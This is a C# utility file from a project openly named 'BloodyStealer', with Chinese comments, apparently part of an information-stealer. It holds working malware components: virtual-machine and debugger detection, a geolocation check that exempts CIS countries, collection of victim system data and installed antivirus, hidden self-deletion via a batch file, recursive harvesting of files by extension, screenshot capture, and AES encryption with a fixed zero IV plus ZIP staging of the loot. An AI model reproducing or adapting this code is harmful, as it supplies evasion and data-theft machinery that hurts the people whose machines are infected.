using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Drawing;
using System.Management;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace BloodyStealer
{
    /// <summary>
    /// 提供各种工具函数，包括加密、压缩和系统信息
    /// </summary>
    internal static class Utils
    {
        #region 加密功能
        
        /// <summary>
        /// 使用AES算法加密字符串
        /// </summary>
        /// <param name="plainText">要加密的文本</param>
        /// <param name="key">密钥</param>
        /// <returns>加密后的Base64字符串</returns>
        public static string EncryptString(string plainText, string key)
        {
            try
            {
                byte[] iv = new byte[16];
                byte[] array;
                
                using (Aes aes = Aes.Create())
                {
                    aes.Key = Encoding.UTF8.GetBytes(key);
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                    
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                        {
                            using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
                            {
                                streamWriter.Write(plainText);
                            }
                            
                            array = memoryStream.ToArray();
                        }
                    }
                }
                
                return Convert.ToBase64String(array);
            }
            catch
            {
                return string.Empty;
            }
        }
        
        /// <summary>
        /// 使用AES算法解密字符串
        /// </summary>
        /// <param name="cipherText">已加密的Base64字符串</param>
        /// <param name="key">密钥</param>
        /// <returns>解密后的字符串</returns>
        public static string DecryptString(string cipherText, string key)
        {
            try
            {
                byte[] iv = new byte[16];
                byte[] buffer = Convert.FromBase64String(cipherText);
                
                using (Aes aes = Aes.Create())
                {
                    aes.Key = Encoding.UTF8.GetBytes(key);
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                    
                    using (MemoryStream memoryStream = new MemoryStream(buffer))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader streamReader = new StreamReader(cryptoStream))
                            {
                                return streamReader.ReadToEnd();
                            }
                        }
                    }
                }
            }
            catch
            {
                return string.Empty;
            }
        }
        
        /// <summary>
        /// 加密文件内容
        /// </summary>
        /// <param name="inputFile">输入文件路径</param>
        /// <param name="outputFile">输出文件路径</param>
        /// <param name="key">加密密钥</param>
        /// <returns>是否成功</returns>
        public static bool EncryptFile(string inputFile, string outputFile, string key)
        {
            try
            {
                byte[] iv = new byte[16];
                byte[] fileContent = File.ReadAllBytes(inputFile);
                
                using (Aes aes = Aes.Create())
                {
                    aes.Key = Encoding.UTF8.GetBytes(key);
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    
                    ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                    
                    using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create))
                    {
                        using (CryptoStream cs = new CryptoStream(fsOutput, encryptor, CryptoStreamMode.Write))
                        {
                            cs.Write(fileContent, 0, fileContent.Length);
                        }
                    }
                }
                
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        #endregion
        
        #region 压缩功能
        
        /// <summary>
        /// 压缩文件夹到ZIP文件
        /// </summary>
        /// <param name="sourceDirectory">源目录</param>
        /// <param name="destinationZipFile">目标ZIP文件</param>
        /// <returns>是否成功</returns>
        public static bool CompressDirectory(string sourceDirectory, string destinationZipFile)
        {
            try
            {
                if (File.Exists(destinationZipFile))
                {
                    File.Delete(destinationZipFile);
                }
                
                ZipFile.CreateFromDirectory(sourceDirectory, destinationZipFile, 
                    CompressionLevel.Optimal, false);
                
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        /// <summary>
        /// 添加文件到ZIP存档
        /// </summary>
        /// <param name="zipPath">ZIP文件路径</param>
        /// <param name="filePath">要添加的文件路径</param>
        /// <param name="entryName">在ZIP中的条目名称</param>
        /// <returns>是否成功</returns>
        public static bool AddFileToZip(string zipPath, string filePath, string entryName)
        {
            try
            {
                using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Open))
                {
                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Update))
                    {
                        ZipArchiveEntry entry = archive.CreateEntry(entryName);
                        using (Stream writer = entry.Open())
                        {
                            using (FileStream fileStream = new FileStream(filePath, FileMode.Open))
                            {
                                fileStream.CopyTo(writer);
                            }
                        }
                    }
                }
                
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        /// <summary>
        /// 解压ZIP文件到目录
        /// </summary>
        /// <param name="zipPath">ZIP文件路径</param>
        /// <param name="extractPath">解压目标路径</param>
        /// <returns>是否成功</returns>
        public static bool ExtractZip(string zipPath, string extractPath)
        {
            try
            {
                ZipFile.ExtractToDirectory(zipPath, extractPath);
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        #endregion
        
        #region 系统信息
        
        /// <summary>
        /// 检测是否运行在虚拟机环境中
        /// </summary>
        /// <returns>如果是虚拟机返回true，否则返回false</returns>
        public static bool IsVirtualMachine()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    using (ManagementObjectCollection items = searcher.Get())
                    {
                        foreach (ManagementObject item in items)
                        {
                            string manufacturer = item["Manufacturer"]?.ToString() ?? string.Empty;
                            string model = item["Model"]?.ToString() ?? string.Empty;
                            
                            foreach (string vmName in Settings.VmNames)
                            {
                                if (manufacturer.IndexOf(vmName, StringComparison.OrdinalIgnoreCase) >= 0 ||
                                    model.IndexOf(vmName, StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    return true;
                                }
                            }
                        }
                    }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        /// <summary>
        /// 检测是否运行在调试器环境中
        /// </summary>
        /// <returns>如果在调试器中运行返回true，否则返回false</returns>
        public static bool IsDebugging()
        {
            try
            {
                // 检查是否有调试进程
                foreach (string badProcess in Settings.BadProcesses)
                {
                    Process[] processes = Process.GetProcessesByName(badProcess);
                    if (processes.Length > 0)
                    {
                        return true;
                    }
                }
                
                // 检查调试器是否附加
                if (Debugger.IsAttached)
                {
                    return true;
                }
                
                // 检查是否被远程调试
                bool isDebuggerPresent = false;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                
                return isDebuggerPresent;
            }
            catch
            {
                return false;
            }
        }
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        
        /// <summary>
        /// 获取国家代码
        /// </summary>
        /// <returns>两字母国家代码</returns>
        public static string GetCountryCode()
        {
            try
            {
                string url = "http://ip-api.com/json/";
                WebClient client = new WebClient();
                string response = client.DownloadString(url);
                
                // 简单解析JSON
                string countryCode = response.Split(new[] { "\"countryCode\":\"" }, StringSplitOptions.None)[1].Split('\"')[0];
                
                return countryCode;
            }
            catch
            {
                return "XX"; // 未知
            }
        }
        
        /// <summary>
        /// 检查是否在独联体国家
        /// </summary>
        /// <returns>是否在独联体国家</returns>
        public static bool IsInCISCountry()
        {
            try
            {
                string countryCode = GetCountryCode();
                
                foreach (string cisCountry in Settings.CisCountries)
                {
                    if (cisCountry.Equals(countryCode, StringComparison.OrdinalIgnoreCase))
                    {
                        return true;
                    }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        /// <summary>
        /// 获取系统信息
        /// </summary>
        /// <returns>系统信息字典</returns>
        public static Dictionary<string, string> GetSystemInfo()
        {
            Dictionary<string, string> sysInfo = new Dictionary<string, string>();
            
            try
            {
                sysInfo["OS"] = Environment.OSVersion.ToString();
                sysInfo["CPU"] = GetCpuInfo();
                sysInfo["RAM"] = GetRamInfo();
                sysInfo["MachineName"] = Environment.MachineName;
                sysInfo["UserName"] = Environment.UserName;
                sysInfo["DomainName"] = Environment.UserDomainName;
                sysInfo["Language"] = System.Globalization.CultureInfo.CurrentCulture.Name;
                sysInfo["TimeZone"] = TimeZone.CurrentTimeZone.StandardName;
                sysInfo["ScreenResolution"] = GetScreenResolution();
                sysInfo["InstalledAV"] = GetInstalledAntivirus();
                
                try
                {
                    WebClient client = new WebClient();
                    sysInfo["PublicIP"] = client.DownloadString("https://api.ipify.org");
                }
                catch
                {
                    sysInfo["PublicIP"] = "Unknown";
                }
            }
            catch
            {
                // 忽略获取系统信息时的错误
            }
            
            return sysInfo;
        }
        
        private static string GetCpuInfo()
        {
            try
            {
                using (ManagementClass mc = new ManagementClass("Win32_Processor"))
                using (ManagementObjectCollection moc = mc.GetInstances())
                {
                    foreach (ManagementObject mo in moc)
                    {
                        return mo["Name"]?.ToString() ?? "Unknown CPU";
                    }
                }
            }
            catch { }
            
            return "Unknown CPU";
        }
        
        private static string GetRamInfo()
        {
            try
            {
                using (ManagementClass mc = new ManagementClass("Win32_ComputerSystem"))
                using (ManagementObjectCollection moc = mc.GetInstances())
                {
                    foreach (ManagementObject mo in moc)
                    {
                        ulong totalMemory = Convert.ToUInt64(mo["TotalPhysicalMemory"]);
                        return $"{(totalMemory / (1024 * 1024)):N0} MB";
                    }
                }
            }
            catch { }
            
            return "Unknown RAM";
        }
        
        private static string GetScreenResolution()
        {
            try
            {
                Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                return $"{bounds.Width} x {bounds.Height}";
            }
            catch
            {
                return "Unknown";
            }
        }
        
        private static string GetInstalledAntivirus()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntivirusProduct"))
                {
                    List<string> avList = new List<string>();
                    
                    using (ManagementObjectCollection items = searcher.Get())
                    {
                        foreach (ManagementObject item in items)
                        {
                            avList.Add(item["displayName"].ToString());
                        }
                    }
                    
                    if (avList.Count > 0)
                    {
                        return string.Join(", ", avList);
                    }
                }
            }
            catch { }
            
            return "Unknown";
        }
        
        #endregion
        
        #region 文件操作
        
        /// <summary>
        /// 安全删除自身
        /// </summary>
        public static void SelfDestruct()
        {
            try
            {
                string batchPath = Path.Combine(Path.GetTempPath(), "delete.bat");
                string exePath = Assembly.GetExecutingAssembly().Location;
                string pid = Process.GetCurrentProcess().Id.ToString();
                
                // 创建批处理文件，等待进程退出后删除可执行文件
                string batchContent = 
                    "@echo off\r\n" +
                    "taskkill /F /PID " + pid + "\r\n" +
                    ":loop\r\n" +
                    "del \"" + exePath + "\"\r\n" +
                    "if exist \"" + exePath + "\" goto loop\r\n" +
                    "del \"%~f0\"";
                
                File.WriteAllText(batchPath, batchContent);
                
                // 启动批处理文件
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = batchPath,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true
                };
                
                Process.Start(startInfo);
            }
            catch
            {
                // 忽略错误
            }
        }
        
        /// <summary>
        /// 递归查找符合指定扩展名的文件
        /// </summary>
        /// <param name="directory">起始目录</param>
        /// <param name="extensions">文件扩展名数组</param>
        /// <param name="maxResults">最大结果数</param>
        /// <param name="maxFileSize">最大文件大小（字节）</param>
        /// <returns>文件路径列表</returns>
        public static List<string> FindFiles(string directory, string[] extensions, int maxResults, long maxFileSize)
        {
            List<string> results = new List<string>();
            
            try
            {
                if (!Directory.Exists(directory))
                {
                    return results;
                }
                
                // 首先检查当前目录中的文件
                foreach (string extension in extensions)
                {
                    string pattern = $"*{extension}";
                    string[] files = Directory.GetFiles(directory, pattern);
                    
                    foreach (string file in files)
                    {
                        if (results.Count >= maxResults)
                        {
                            return results;
                        }
                        
                        FileInfo fileInfo = new FileInfo(file);
                        if (fileInfo.Length <= maxFileSize)
                        {
                            results.Add(file);
                        }
                    }
                }
                
                // 然后递归检查子目录
                string[] subDirectories = Directory.GetDirectories(directory);
                foreach (string subDirectory in subDirectories)
                {
                    try
                    {
                        List<string> subResults = FindFiles(subDirectory, extensions, maxResults - results.Count, maxFileSize);
                        results.AddRange(subResults);
                        
                        if (results.Count >= maxResults)
                        {
                            return results;
                        }
                    }
                    catch
                    {
                        // 忽略访问被拒绝的目录
                    }
                }
            }
            catch
            {
                // 忽略错误
            }
            
            return results;
        }
        
        /// <summary>
        /// 截取屏幕截图
        /// </summary>
        /// <param name="outputPath">输出文件路径</param>
        /// <returns>是否成功</returns>
        public static bool CaptureScreenshot(string outputPath)
        {
            try
            {
                Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    
                    bitmap.Save(outputPath, System.Drawing.Imaging.ImageFormat.Jpeg);
                }
                
                return true;
            }
            catch
            {
                return false;
            }
        }
        
        #endregion
    }
} 